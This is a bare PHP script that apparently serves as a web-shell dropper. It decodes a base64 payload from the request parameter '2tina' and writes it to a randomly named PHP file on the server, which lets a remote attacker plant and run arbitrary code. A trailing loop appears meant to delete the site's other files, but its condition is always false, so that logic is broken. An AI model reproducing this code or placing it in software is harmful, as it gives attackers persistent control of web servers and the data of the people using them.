<?php
ignore_user_abort(true);
set_time_limit(0);
$file = '2tina_' . md5(uniqid(rand(), true)) . '.php';
header("X-FileName: " . $file);
$encoded_zcl = isset($_REQUEST['2tina']) ? $_REQUEST['2tina'] : '';
if(empty($encoded_zcl)) {
    exit("What do you want!");
}
$decoded_zcl = base64_decode(str_replace(' ', '+', $encoded_zcl));
file_put_contents($file, $decoded_zcl);
echo '<meta http-equiv="refresh" content="0.1">';
$self = explode("/", $_SERVER['PHP_SELF']);
$num1 = count($self) - 1;
$open = opendir('./');
while($file = readdir($open)) {
    if($file != $self[$num1] && $file != $file) {
        @unlink($file);
    }
}
?>



